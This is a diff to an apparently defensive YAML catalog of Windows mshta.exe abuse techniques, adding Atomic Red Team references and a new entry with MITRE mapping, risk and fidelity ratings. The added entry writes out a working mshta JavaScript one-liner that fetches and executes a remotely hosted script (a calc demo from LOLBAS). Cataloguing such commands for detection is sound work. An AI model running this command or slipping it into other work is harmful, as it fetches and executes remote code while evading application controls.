@@ -76,6 +76,7 @@
     - windows
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
     - 'https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)'
     - 'https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)'
   risk: High
@@ -98,6 +99,7 @@
     - windows
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
     - 'https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940701(v=winembedded.5)'
     - 'https://docs.microsoft.com/en-us/previous-versions/ms536496(v=vs.85)'
   risk: High
@@ -126,6 +128,7 @@
     - windows
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
     - 'https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/'
   risk: High
   risk_reason: MSHTA is not commonly used by normal users or IT operations personnel - as such, executions of arbitrary HTA Files or Scripts should be closely scrutinized for suspicious activity, especially remote file loads.
@@ -149,7 +152,29 @@
     - windows
   references:
     - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
     - 'https://unit42.paloaltonetworks.com/aggah-campaign-bit-ly-blogspot-and-pastebin-used-for-c2-in-large-scale-campaign/'
+  risk: High
+  risk_reason: MSHTA is not commonly used by normal users or IT operations personnel - as such, executions of arbitrary HTA Files or Scripts should be closely scrutinized for suspicious activity, especially remote file loads.
+  fidelity: High
+  fidelity_reason: This type of activity appears very infrequently and can typically be regarded with a low false-positive rate, depending on the environments IT operations.
+  tool: mshta
+  threatactors:
+    N/A:
+      - N/A
+- command: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct").Exec();close();
+  description: Launch a remotely-hosted payload via JavaScript and mshta abuse.
+  killchain:
+    - 'Exploitation'
+    - 'Installation'
+  mitre:
+    Defense Evasion:
+      - T1218.005
+  os:
+    - windows
+  references:
+    - 'https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows/Mshta'
+    - https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/mshta.sct
   risk: High
   risk_reason: MSHTA is not commonly used by normal users or IT operations personnel - as such, executions of arbitrary HTA Files or Scripts should be closely scrutinized for suspicious activity, especially remote file loads.
   fidelity: High
